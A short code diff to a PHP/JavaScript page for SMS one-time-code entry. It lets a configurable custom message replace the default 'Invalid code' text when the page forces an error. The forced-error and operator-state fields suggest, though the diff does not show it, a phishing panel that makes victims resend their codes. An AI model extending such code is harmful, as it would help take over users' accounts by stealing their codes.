@@ -242,6 +242,7 @@ $initialState = [
     'instruction_token' => $smsState['instruction_token'] ?? time(),
     'custom_url' => $smsState['custom_url'] ?? '',
     'chat_enabled' => !empty($smsState['chat_enabled']),
+    'custom_error' => $smsState['custom_error'] ?? '',
     'has_error_param' => isset($_GET['error']) || isset($_GET['otp_error'])
 ];
 ?>
@@ -484,7 +485,8 @@ $initialState = [
         }
 
         if (forceError) {
-            showStatus('error', 'Invalid code. Please wait a moment before trying again.');
+            const customError = (state.custom_error || '').trim();
+            showStatus('error', customError || 'Invalid code. Please wait a moment before trying again.');
             setFormDisabled(true);
             toggleExitFlag(true);
             setTimeout(() => setFormDisabled(false), 5000);
